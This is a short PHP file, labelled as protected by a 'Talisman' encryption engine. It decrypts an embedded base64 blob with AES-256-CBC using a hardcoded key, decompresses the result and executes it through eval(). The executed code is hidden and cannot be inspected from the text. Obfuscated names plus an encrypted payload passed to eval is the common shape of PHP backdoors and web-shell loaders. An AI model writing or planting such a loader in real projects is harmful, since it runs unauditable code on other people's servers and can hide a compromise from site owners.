<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$kf1571 = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p4a85f = base64_decode('L54lcXgosA3crEGliZgJ3HdwWnJaN24yVHBwemJuV0o3Qk8vcllpWE9PaHd5TWRrYWwvSlJhMU9NeGc1TXJpbjNmWWNLZVlvMysxMzhmblhiMHFDZUZodjFQZDhUdFdVRTl6TkFDU2dDbXh0Y2RBRWtkOUZEQVhtS1VzPQ==');
$i902d6 = openssl_cipher_iv_length('aes-256-cbc');
$v2a165 = substr($p4a85f, 0, $i902d6);
$cdec1a = substr($p4a85f, $i902d6);
eval('?>'.gzinflate(openssl_decrypt($cdec1a, 'aes-256-cbc', $kf1571, 0, $v2a165)));